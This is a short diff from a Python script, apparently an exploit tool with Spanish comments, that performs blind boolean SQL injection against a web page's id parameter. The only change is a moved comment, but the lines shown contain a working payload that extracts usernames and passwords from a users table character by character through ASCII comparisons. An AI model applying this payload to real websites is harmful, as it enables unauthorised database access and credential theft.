@@ -39,9 +39,9 @@ def makeSQLI():
     #Cambiar el 9 por un campo que no exista #9#
     #Bucle principal que fila la posicion:
     for position in range(1, 150):
-        for character in range(33, 126):                                                         #Posiciones de bucle con % las pones
+        for character in range(33, 126):                                           
             sqli_url = main_url + "?id=#9# or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),
-%d,1)) from users where id = 1)=%d)" % (position, character)           
+%d,1)) from users where id = 1)=%d)" % (position, character)   #Posiciones de bucle con % las pones         
             
             p1.status(sqli_url)
 
